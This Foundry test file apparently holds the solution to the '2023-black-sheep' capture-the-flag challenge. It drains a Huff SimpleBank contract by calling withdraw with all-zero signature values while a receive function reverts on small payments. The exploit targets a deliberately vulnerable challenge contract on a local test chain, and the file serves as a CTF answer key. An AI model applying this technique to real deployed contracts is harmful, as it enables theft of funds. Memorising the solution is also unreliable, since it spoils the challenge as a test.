// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "foundry-huff/HuffConfig.sol";
import {Challenge} from "./Challenge.sol";
import {ISimpleBank} from "./ISimpleBank.sol";

contract BlackSheepTest is Test {
    function setUp() public {}

    function test_exploitBlackSheep() public {
        HuffConfig config = new HuffConfig();
        ISimpleBank bank = ISimpleBank(
            config.deploy("2023-black-sheep/SimpleBank")
        );
        payable(address(bank)).transfer(10 ether);
        Challenge challenge = new Challenge(bank);

        assertEq(challenge.isSolved(), false);
        bank.withdraw{value: 9 wei}(
            bytes32(
                0x0000000000000000000000000000000000000000000000000000000000000000
            ),
            0x0,
            bytes32(
                0x0000000000000000000000000000000000000000000000000000000000000000
            ),
            bytes32(
                0x0000000000000000000000000000000000000000000000000000000000000000
            )
        );
        assertEq(challenge.isSolved(), true);
    }

    receive() external payable {
        if (msg.value < 50 wei) {
            revert("12333");
        }
    }
}
